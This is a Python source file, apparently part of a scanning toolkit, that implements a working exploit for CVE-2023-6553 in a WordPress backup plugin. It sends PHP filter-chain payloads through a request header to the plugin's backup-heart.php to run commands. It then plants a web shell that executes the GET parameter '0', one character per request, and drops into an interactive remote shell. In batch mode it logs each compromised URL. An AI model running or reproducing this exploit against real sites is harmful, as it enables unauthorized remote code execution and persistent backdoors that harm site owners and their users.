import re
import random
import string
import requests
from pub.com.outprint import OutPrintInfoSuc
from rich.console import Console
from rich.progress import Progress
from prompt_toolkit import PromptSession
from prompt_toolkit.formatted_text import HTML
from prompt_toolkit.history import InMemoryHistory
from cve.Wordpress.CVE_2023_6553_main.php_filter_chain import PHPFilterChainGenerator
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


class CVE_2023_6553:
    def __init__(self, base_url,batch):
        self.console = Console()
        self.batch = batch
        self.base_url = base_url
        self.random_file_name = (
            "".join(random.choices(string.ascii_letters + string.digits, k=3)) + ".php"
        )

    def generate_php_filter_payload(self, command):
        generator = PHPFilterChainGenerator()
        return generator.generate_filter_chain(command)

    def send_payload(self, payload):
        headers = {"Content-Dir": payload}
        text = "This is server side script, you will not get any response here"

        try:
            response = requests.post(
                f"{self.base_url}/wp-content/plugins/backup-backup/includes/backup-heart.php",
                headers=headers,
                verify=False,
                timeout=10,
            )

            return response.status_code == 200 and (
                not response.text or text in response.text
            )

        except requests.exceptions.ChunkedEncodingError:
            return True
        except requests.exceptions.RequestException as e:
            return False

    @staticmethod
    def char_to_hex_escaped(char):
        return "\\x" + "{:02x}".format(ord(char))

    def check_vulnerability(self):
        try:
            random_text = "".join(
                random.choices(string.ascii_letters + string.digits, k=3)
            )
            payload = f"<?php `echo '{random_text}'>{self.random_file_name}`;?>"
            self.send_payload(self.generate_php_filter_payload(payload))

            response = requests.get(
                f"{self.base_url}/wp-content/plugins/backup-backup/includes/{self.random_file_name}",
                verify=False,
                timeout=10,
            )
            if response.text.strip() == random_text:
                if not self.batch:
                    self.console.print(
                        f"[bold green]{self.base_url} is vulnerable to CVE-2023-6553[/bold green]"
                    )
                    OutPrintInfoSuc("WordPress",
                                    f"Shell Addr: {self.base_url}/wp-content/plugins/backup-backup/includes/{self.random_file_name}")

                return True
        except requests.exceptions.RequestException as e:
            pass

        return False

    def write_string_to_file(self, string_to_write):
        init_command = f"<?php `echo>{self.random_file_name}`;?>"
        self.send_payload(self.generate_php_filter_payload(init_command))

        with Progress() as progress:
            task = progress.add_task("[green]Writing...", total=len(string_to_write))

            for char in string_to_write:
                hex_escaped_char = self.char_to_hex_escaped(char)
                command = (
                    f"<?php `echo -n '{hex_escaped_char}'>>{self.random_file_name}`;?>"
                )

                if not self.send_payload(self.generate_php_filter_payload(command)):
                    print(f"Failed to send payload for character: {char}")
                    return False

                progress.update(task, advance=1)

        return True

    def retrieve_command_output(self, command):
        payload = {"0": command}
        console = Console()
        try:
            response = requests.get(
                f"{self.base_url}/wp-content/plugins/backup-backup/includes/{self.random_file_name}",
                params=payload,
                verify=False,
                timeout=10,
            )
            if not self.batch:
                console.print(f"[bold green]{self.base_url}/wp-content/plugins/backup-backup/includes/{self.random_file_name}")
                console.print(f"[bold green]Payload {payload}")
            response_text = response.text
            match = re.search(r"\[S\](.*?)\[E\]", response_text, re.DOTALL)
            if match:
                return match.group(1)
            else:
                return "No output, maybe system functions are disabled..."
        except requests.exceptions.RequestException as e:
            return "Error retrieving command output: " + str(e)


def interactive_shell(cve_exploit):
    console = Console()
    session = PromptSession(InMemoryHistory())

    while True:
        try:
            cmd = session.prompt(HTML("<ansired><b># </b></ansired>")).strip().lower()
            if cmd == "exit":
                break
            if cmd == "clear":
                console.clear()
                continue

            output = cve_exploit.retrieve_command_output(cmd)
            console.print(f"[bold green]{output}[/bold green]")

        except KeyboardInterrupt:
            console.print(f"[bold yellow][+] Exiting...[/bold yellow]")
            break


class Cve_2023_6553:
    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')

        cve_exploit = CVE_2023_6553(url,self.batch)
        if cve_exploit.check_vulnerability():
            # if not check:
            if not self.batch:
                cve_exploit.console.print(
                    "[bold green]Initiating shell deployment. This may take a moment..."
                )
            string_to_write = '<?php echo "[S]";echo `$_GET[0]`;echo "[E]";?>'
            if cve_exploit.write_string_to_file(string_to_write):
                if self.batch:
                    OutPrintInfoSuc("WordPress",f"Get-Shell成功: {url}")
                    with open("./result/wordpress_2023_6553.txt","a") as w:
                        w.write(f"{url}\n")
                else:
                    cve_exploit.console.print(
                        f"[bold green]Shell written successfully."
                    )
                    interactive_shell(cve_exploit)
            else:
                if not self.batch:
                    print("Failed to write shell.")
        else:
            if not self.batch:
                cve_exploit.console.print(
                    f"[bold red]{url} is not vulnerable to CVE-2023-6553"
                )


